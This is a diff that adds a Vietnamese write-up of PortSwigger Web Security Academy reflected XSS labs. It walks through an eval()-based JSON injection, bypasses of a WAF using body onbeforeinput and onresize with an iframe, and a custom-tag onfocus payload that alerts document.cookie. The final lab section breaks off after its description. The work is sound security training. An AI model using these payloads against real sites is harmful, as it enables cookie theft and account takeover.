@@ -75,4 +75,161 @@ To solve this lab, create an injection that calls the alert() function.
   
 ```
   
+Khi ta nhập bất kì vào thanh search, 1 GET request sẽ được gửi thông qua /search-results?search=
 
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/15aa4793-94c9-49f4-84e4-d0fa47e9cf4f)
+
+Tuy vậy thì trước đó, nó đã được xử lí qua file searchResult.js:
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/d5617f55-8769-4af4-9d9a-cce6df5c5176)
+
+```
+
+function search(path) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (this.readyState == 4 && this.status == 200) {
+            eval('var searchResultsObj = ' + this.responseText);
+            displaySearchResults(searchResultsObj);
+        }
+    };
+    xhr.open("GET", path + window.location.search);
+    xhr.send();
+
+    function displaySearchResults(searchResultsObj) {
+        var blogHeader = document.getElementsByClassName("blog-header")[0];
+        var blogList = document.getElementsByClassName("blog-list")[0];
+        var searchTerm = searchResultsObj.searchTerm
+        var searchResults = searchResultsObj.results
+
+        var h1 = document.createElement("h1");
+        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
+        blogHeader.appendChild(h1);
+        var hr = document.createElement("hr");
+        blogHeader.appendChild(hr)
+
+        for (var i = 0; i < searchResults.length; ++i)
+        {
+            var searchResult = searchResults[i];
+            if (searchResult.id) {
+                var blogLink = document.createElement("a");
+                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);
+
+                if (searchResult.headerImage) {
+                    var headerImage = document.createElement("img");
+                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
+                    blogLink.appendChild(headerImage);
+                }
+
+                blogList.appendChild(blogLink);
+            }
+
+            blogList.innerHTML += "<br/>";
+
+            if (searchResult.title) {
+                var title = document.createElement("h2");
+                title.innerText = searchResult.title;
+                blogList.appendChild(title);
+            }
+
+            if (searchResult.summary) {
+                var summary = document.createElement("p");
+                summary.innerText = searchResult.summary;
+                blogList.appendChild(summary);
+            }
+
+            if (searchResult.id) {
+                var viewPostButton = document.createElement("a");
+                viewPostButton.setAttribute("class", "button is-small");
+                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
+                viewPostButton.innerText = "View post";
+            }
+        }
+
+        var linkback = document.createElement("div");
+        linkback.setAttribute("class", "is-linkback");
+        var backToBlog = document.createElement("a");
+        backToBlog.setAttribute("href", "/");
+        backToBlog.innerText = "Back to Blog";
+        linkback.appendChild(backToBlog);
+        blogList.appendChild(linkback);
+    }
+}
+
+```
+Ta để ý hàm eval, nó sẽ là nơi để ta thực thi xss.
+Ở đây ta có thể dùng \ để escape JSON response và thực thi xss
+                                                 
+> "\-alert(1)}\\           
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/e51b2120-3647-4314-9022-afcc96e133ad)
+
+  
+  
+## [Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
+  
+```
+This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
+
+To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function
+                                                 
+```
+  
+  
+Như tên bài tag và các attributes bị blocked khi nhập vào thanh search: 
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/13b54cba-61e1-48c3-a5fa-76a98439089c)
+
+Tuy vậy vẫn còn vài tag chừa lại:
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/554dc529-4924-4d43-842d-dba62e605db8)
+  
+Ta sẽ dùng thẻ body, tiếp tục tìm attribute còn dùng được: 
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/11e376ba-532a-41bc-b2e9-cf42fb8d2584)
+  
+Ở đây ta sẽ dùng hàm onbeforeinput, khi thực thi người dùng chỉ cần nhập vào thanh search là nó sẽ tự động thực thi alert trước:
+  
+> <body onbeforeinput=alert(1)>
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/242780f9-d7ba-4d76-b7cd-269e39c853dd)
+
+Tuy vậy bài muốn ta thực thi print(), thay alert(1) bằng hàm print là được:
+  
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/1ef1b6b3-65d0-4975-9aa4-c44d1dc97099)
+
+  
+Việc còn lại là gửi đến cho nạn nhân, tuy nhiên thì onbeforeinput ở đây sẽ không được thực thi tự động mà phải có hành động với việc nhập vào thanh search, nên ta sẽ đổi sang th onresize và thực thi tự động với iframe bằng cách thêm attribute onload: 
+  
+> <iframe src="https://0aef000703d6e364806f0d8d00e00027.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
+  
+  
+## [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
+  
+```
+  
+This lab blocks all HTML tags except custom ones.
+
+To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie.
+  
+```
+Như tiêu đề, tất cả các thẻ đều bị block ngoài các custom tag, dựa vào gợi ý ta có thể dùng script sau trên hacktricks:
+  
+> /?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
+  
+Trong đó thì ta sử dụng 2 thuộc tính là id và onfocus.  Khi trang web tải mã HTML này, nó sẽ tạo ra một đối tượng <xss> và trang web sẽ focus vào đối tượng này bằng cách sử dụng dấu # trong URL và sau đó nó sẽ thực thi đoạn mã JavaScript được đính kèm trong thuộc tính onfocus
+  
+> <xss id=x onfocus=alert(document.cookie) tabindex=1>#x
+
+![image](https://github.com/manhhuy2002/Writeup/assets/104350480/0054fea8-0088-4b48-93fd-a2b56024216e)
+  
+## [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
+
+```
+This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
+
+To solve the lab, perform a cross-site scripting attack that calls the alert() function.
+
+```
+  
+  
